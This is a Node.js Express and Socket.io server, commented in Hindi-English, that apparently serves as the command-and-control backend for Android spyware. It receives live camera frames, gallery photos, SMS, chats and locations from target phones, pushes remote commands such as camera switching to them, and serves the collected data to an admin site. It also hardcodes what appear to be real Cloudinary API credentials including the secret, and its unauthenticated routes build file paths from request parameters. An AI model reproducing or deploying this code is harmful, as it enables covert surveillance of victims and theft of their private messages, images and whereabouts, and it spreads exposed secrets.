const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); // 👈 Socket ke liye zaroori
const { Server } = require('socket.io'); // 👈 Socket.io library

const app = express();
const PORT = process.env.PORT || 3000;

// 🔥 SERVER SETUP WITH SOCKET.IO
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    pingTimeout: 60000,   // Connection ko mazboot banane ke liye
    pingInterval: 25000
});

// --- 1. CLOUDINARY CONFIG ---
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

// --- 2. SETUP & MIDDLEWARE ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

// Live Status Storage
let devicesStatus = {}; 

// --- 3. ROOT ROUTE ---
app.get('/', (req, res) => {
    res.send('✅ Server is Running Successfully (Chat, HD Gallery & Live Stream Ready)!');
});

// ==================================================
// 🔥 SOCKET.IO - LIVE STREAMING & COMMAND SYSTEM
// ==================================================


io.on('connection', (socket) => {
    console.log('⚡ New Connection:', socket.id);

    // A. Android Phone se video frame aayega
    socket.on('video-frame', (data) => {
        // data = { id: "DEVICE_ID", frame: "base64_string" }
        // Ye frame seedha website (Admin) ko bhej do
        socket.broadcast.emit('display-frame', data);
    });

    // B. Website (Admin) se command aayegi (Camera Switch etc.)
    socket.on('admin-command', (data) => {
        const targetId = data.device_id.toUpperCase();
        console.log(`🚀 Command '${data.command}' received for ${targetId}`);
        
        // Ye command us specific device ko bhej do
        socket.broadcast.emit('execute-command-' + targetId, data.command);
    });

    socket.on('disconnect', (reason) => {
        console.log('❌ User Disconnected. Reason:', reason);
    });
});

// ==================================================
//  GALLERY SYSTEM (HD PHOTOS)
// ==================================================

app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });

    const id = device_id.toString().trim().toUpperCase();
    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;

    cloudinary.uploader.upload(base64Image, { 
        folder: id, 
        resource_type: "image",
        width: 1280, 
        quality: "auto" 
    }, (error, result) => {
        if (error) return res.status(500).json({ error: "Upload Failed" });
        res.json({ status: "success", url: result.secure_url });
    });
});

app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    cloudinary.api.resources({
        type: 'upload', prefix: id + "/", max_results: 20, direction: 'desc'
    }, (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        res.json({ photos: result.resources.map(img => img.secure_url), next_cursor: result.next_cursor });
    });
});

// ==================================================
//  ADMIN & STATUS (Online/Offline)
// ==================================================

app.get('/api/admin/all-devices', (req, res) => res.json(devicesStatus));

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, charging } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        let pendingCommand = "none";

        if (devicesStatus[id] && devicesStatus[id].command) {
            pendingCommand = devicesStatus[id].command;
            devicesStatus[id].command = "none";
        }

        devicesStatus[id] = {
            ...devicesStatus[id],
            id: id,
            model: model || "Unknown",
            battery: battery || level || 0,
            lastSeen: Date.now()
        };
        res.json({ status: "success", command: pendingCommand });
    } catch (e) { res.status(500).json({ error: "Server Error" }); }
});

// ==================================================
//  DATA STORAGE (SMS, CHATS, LOCATION)
// ==================================================

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        let existingData = [];

        if (fs.existsSync(filePath)) {
            try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }

        let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
        let finalData;

        if (type === 'location') {
            finalData = parsedData; // Location me hamesha latest
        } else {
            finalData = [...newDataArray, ...existingData].slice(0, 5000); // Baki me history
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });
    } catch (error) { res.status(500).json({ status: "error" }); }
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

// 🔥 LISTEN WITH SERVER (Important)
server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
